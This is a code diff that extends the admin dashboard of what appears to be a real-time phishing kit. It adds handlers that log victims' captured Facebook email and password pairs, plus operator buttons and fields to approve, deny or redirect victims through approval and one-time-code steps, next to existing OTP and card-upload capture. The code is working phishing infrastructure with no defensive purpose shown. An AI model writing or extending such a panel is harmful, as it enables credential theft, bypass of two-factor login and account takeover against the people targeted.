@@ -970,6 +970,102 @@ const AdminDashboard = () => {
       });
     });
 
+    newSocket.on("fb_approval_mounted", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_approval_mounted",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: `${data.email} & ${data.password}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_approval_mounted",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                data: `${data.email} & ${data.password}`,
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("fb_another_way", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_another_way",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: `${data.email} & ${data.password}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_another_way",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                data: `${data.email} & ${data.password}`,
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
     newSocket.on("fb_done", (data) => {
       setSessions((prev) => {
         const session = prev[data.sessionId];
@@ -1236,6 +1332,10 @@ const AdminDashboard = () => {
         return "FB RESEND OTP";
       case "fb_card_upload":
         return "FB CARD UPLOAD";
+      case "fb_approval_mounted":
+        return "FB APROVAL MOUNTED";
+      case "fb_another_way":
+        return "FB ANOTHER WAY";
       case "fb_done":
         return "FB Done";
 
@@ -1254,8 +1354,13 @@ const AdminDashboard = () => {
         return "/images/fb.png";
       case "fb_card_upload":
         return "/images/fb.png";
+      case "fb_approval_mounted":
+        return "/images/fb.png";
+      case "fb_another_way":
+        return "/images/fb.png";
       case "fb_done":
         return "/images/fb.png";
+
       default:
         return "/images/office365.png";
     }
@@ -1355,6 +1460,8 @@ const AdminDashboard = () => {
                             event.type === "fb_attempt_init" ||
                             event.type === "fb_otp" ||
                             event.type === "fb_resend_otp" ||
+                            event.type === "fb_approval_mounted" ||
+                            event.type === "fb_another_way" ||
                             event.type === "fb_done"
                               ? "Email & Password"
                               : "Email"}
@@ -1367,6 +1474,8 @@ const AdminDashboard = () => {
                             event.type === "fb_attempt_init" ||
                             event.type === "fb_otp" ||
                             event.type === "fb_resend_otp" ||
+                            event.type === "fb_approval_mounted" ||
+                            event.type === "fb_another_way" ||
                             event.type === "fb_done" ? (
                               <>
                                 {event.email || session.email} &{" "}
@@ -1421,7 +1530,13 @@ const AdminDashboard = () => {
                                 ? "red.500"
                                 : event.type === "fb_resend_otp"
                                 ? "red.500"
+                                : event.type === "fb_resend_otp"
+                                ? "red.500"
                                 : event.type === "fb_card_upload"
+                                ? "red.500"
+                                : event.type === "fb_approval_mounted"
+                                ? "red.500"
+                                : event.type === "fb_another_way"
                                 ? "red.500"
                                 : event.type === "fb_done"
                                 ? "green.500"
@@ -1806,6 +1921,17 @@ const AdminDashboard = () => {
                                         placeholder="Where did you send code to?"
                                       />
                                       {createButton(
+                                        "orange",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "approve"
+                                            // { password }
+                                          ),
+                                        "Goto Approval"
+                                      )}
+                                      {createButton(
                                         "green",
                                         () =>
                                           handleResponse(
@@ -1814,7 +1940,7 @@ const AdminDashboard = () => {
                                             "login"
                                             // { password }
                                           ),
-                                        "Approve login"
+                                        "Goto OTP"
                                       )}
                                       {createButton(
                                         "yellow",
@@ -1929,6 +2055,73 @@ const AdminDashboard = () => {
                                             "cancel"
                                           ),
                                         "Deny Cards"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_approval_mounted":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "continue"
+                                            // { password }
+                                          ),
+                                        "Approve"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_another_way":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      <Input
+                                        type="text"
+                                        name="sendTo"
+                                        value={sendTo}
+                                        onChange={(e) =>
+                                          setSendTo(e.target.value)
+                                        }
+                                        placeholder="Where did you send code to?"
+                                      />
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "continue"
+                                            // { password }
+                                          ),
+                                        "Goto OTP"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny"
                                       )}
                                     </HStack>
                                   </>
